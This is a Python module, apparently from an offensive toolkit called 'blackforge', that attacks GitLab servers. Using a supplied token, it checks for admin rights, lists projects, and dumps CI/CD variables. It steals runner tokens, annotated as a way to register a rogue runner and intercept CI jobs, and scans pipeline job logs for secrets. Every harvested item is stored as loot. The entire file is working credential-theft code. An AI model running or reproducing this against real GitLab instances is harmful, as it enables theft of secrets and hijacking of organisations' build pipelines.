"""GitLab exploitation: CI/CD variable dump, runner token theft,
pipeline log scanning."""

from __future__ import annotations

from typing import Any, Dict, List

from blackforge.logger import log
from blackforge.models import AttackResult, Credential, EngagementContext
from blackforge.modules.base import BaseModule
from blackforge.utils.http import request
from blackforge.utils.secrets import scan_secrets


class GitLabModule(BaseModule):

    name = "gitlab"

    def run(self, ctx: EngagementContext, **kwargs: Any) -> List[AttackResult]:
        url: str = kwargs.get("url", "")
        token: str = kwargs.get("token", "")
        username: str = kwargs.get("username", "")
        password: str = kwargs.get("password", "")

        results: List[AttackResult] = []
        base = url.rstrip("/")
        hdrs: Dict[str, str] = {"PRIVATE-TOKEN": token} if token else {}
        ctx.loot.setdefault("gitlab", {})

        results.extend(self._verify_access(ctx, base, hdrs))
        results.extend(self._enum_projects(ctx, base, hdrs))
        results.extend(self._dump_ci_vars(ctx, base, hdrs))
        results.extend(self._steal_runner_tokens(ctx, base, hdrs))
        results.extend(self._scan_pipeline_logs(ctx, base, hdrs))
        return results

    def _verify_access(self, ctx: EngagementContext, base: str,
                       hdrs: Dict[str, str]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/v4/user", headers=hdrs)
        if resp and resp.ok:
            data = resp.json()
            ctx.loot["gitlab"]["identity"] = data
            is_admin = data.get("is_admin", False)
            log(f"[GitLab] Authenticated as {data.get('username')}", "OK")
            if is_admin:
                log("[GitLab] ADMIN TOKEN!", "CRIT")
            return [AttackResult(
                "gitlab", "token_verify", "SUCCESS",
                data={"username": data.get("username"), "is_admin": is_admin},
                severity="CRITICAL" if is_admin else "INFO",
                notes=f"Authenticated as {data.get('username')}" + (" [ADMIN]" if is_admin else ""),
            )]
        resp2 = request(ctx, "GET", f"{base}/api/v4/projects?visibility=public")
        if resp2 and resp2.ok:
            return [AttackResult("gitlab", "anon_access", "INFO",
                                 notes="GitLab allows anonymous API access")]
        return [AttackResult("gitlab", "connect", "FAILED", notes="Cannot authenticate")]

    def _enum_projects(self, ctx: EngagementContext, base: str,
                       hdrs: Dict[str, str]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/v4/projects?membership=true&per_page=100", headers=hdrs)
        if not resp or not resp.ok:
            return []
        projects = resp.json() if isinstance(resp.json(), list) else []
        ctx.loot["gitlab"]["projects"] = [
            {"id": p["id"], "name": p["path_with_namespace"], "visibility": p.get("visibility")}
            for p in projects
        ]
        log(f"[GitLab] {len(projects)} accessible projects", "INFO")
        return [AttackResult(
            "gitlab", "projects_enum", "INFO",
            data={"count": len(projects)},
            notes=f"{len(projects)} projects accessible",
        )]

    def _dump_ci_vars(self, ctx: EngagementContext, base: str,
                      hdrs: Dict[str, str]) -> List[AttackResult]:
        all_vars: List[Dict[str, Any]] = []
        for project in ctx.loot.get("gitlab", {}).get("projects", [])[:20]:
            pid = project["id"]
            resp = request(ctx, "GET", f"{base}/api/v4/projects/{pid}/variables", headers=hdrs)
            if resp and resp.ok:
                vars_list = resp.json() if isinstance(resp.json(), list) else []
                for var in vars_list:
                    var_info = {
                        "project": project["name"],
                        "key": var.get("key"),
                        "value": var.get("value", "")[:200],
                        "protected": var.get("protected"),
                        "masked": var.get("masked"),
                    }
                    all_vars.append(var_info)
                    if not var.get("masked"):
                        for s in scan_secrets(var.get("value", "")):
                            log(f"[GitLab] Secret CI var: {project['name']}.{var['key']}: {s['type']}", "CRIT")
                            ctx.credentials.append(Credential(
                                s["type"],
                                {"key": var["key"], "value": s["value"]},
                                f"gitlab:ci_var:{project['name']}",
                                "CI/CD variable",
                            ))
        ctx.loot["gitlab"]["ci_vars"] = all_vars
        visible = [v for v in all_vars if not v.get("masked")]
        return [AttackResult(
            "gitlab", "ci_var_dump",
            "SUCCESS" if all_vars else "INFO",
            severity="CRITICAL" if visible else "HIGH",
            data={"total": len(all_vars), "visible": len(visible)},
            notes=f"{len(all_vars)} CI variables, {len(visible)} unmasked (values readable)",
        )]

    def _steal_runner_tokens(self, ctx: EngagementContext, base: str,
                             hdrs: Dict[str, str]) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{base}/api/v4/runners/all?per_page=100", headers=hdrs)
        if not resp or not resp.ok:
            return []
        runners = resp.json() if isinstance(resp.json(), list) else []
        runner_tokens: List[Dict[str, Any]] = []
        for runner in runners[:10]:
            rid = runner["id"]
            detail_resp = request(ctx, "GET", f"{base}/api/v4/runners/{rid}", headers=hdrs)
            if detail_resp and detail_resp.ok:
                detail = detail_resp.json()
                token = detail.get("token", "")
                if token:
                    runner_tokens.append({
                        "id": rid, "description": detail.get("description", ""),
                        "token": token, "ip": detail.get("ip_address", ""),
                    })
                    log(f"[GitLab] Runner token: {detail.get('description', '?')} | {token}", "CRIT")
                    ctx.credentials.append(Credential(
                        "gitlab_runner_token",
                        {"token": token, "runner_id": str(rid)},
                        f"gitlab:runner:{rid}",
                        "Register rogue runner to intercept CI jobs",
                    ))
        ctx.loot["gitlab"]["runner_tokens"] = runner_tokens
        return [AttackResult(
            "gitlab", "runner_tokens",
            "SUCCESS" if runner_tokens else "INFO",
            severity="CRITICAL" if runner_tokens else "INFO",
            data={"count": len(runner_tokens)},
            notes=f"{len(runner_tokens)} runner tokens stolen.",
        )]

    def _scan_pipeline_logs(self, ctx: EngagementContext, base: str,
                            hdrs: Dict[str, str]) -> List[AttackResult]:
        log_findings: List[Dict[str, Any]] = []
        for project in ctx.loot.get("gitlab", {}).get("projects", [])[:5]:
            pid = project["id"]
            resp = request(ctx, "GET", f"{base}/api/v4/projects/{pid}/jobs?per_page=5", headers=hdrs)
            if not resp or not resp.ok:
                continue
            jobs = resp.json() if isinstance(resp.json(), list) else []
            for job in jobs[:3]:
                log_resp = request(
                    ctx, "GET",
                    f"{base}/api/v4/projects/{pid}/jobs/{job['id']}/trace",
                    headers=hdrs,
                )
                if log_resp and log_resp.ok:
                    for s in scan_secrets(log_resp.text[:10000]):
                        log_findings.append({"project": project["name"], "job": job["id"], **s})
                        log(f"[GitLab] Secret in job log: {project['name']}#{job['id']}: {s['type']}", "CRIT")
                        ctx.credentials.append(Credential(
                            s["type"], {"value": s["value"]},
                            f"gitlab:job_log:{project['name']}#{job['id']}",
                        ))
        return [AttackResult(
            "gitlab", "log_scan",
            "SUCCESS" if log_findings else "INFO",
            severity="CRITICAL" if log_findings else "INFO",
            data={"findings": log_findings},
            notes=f"{len(log_findings)} secrets found in pipeline logs",
        )]
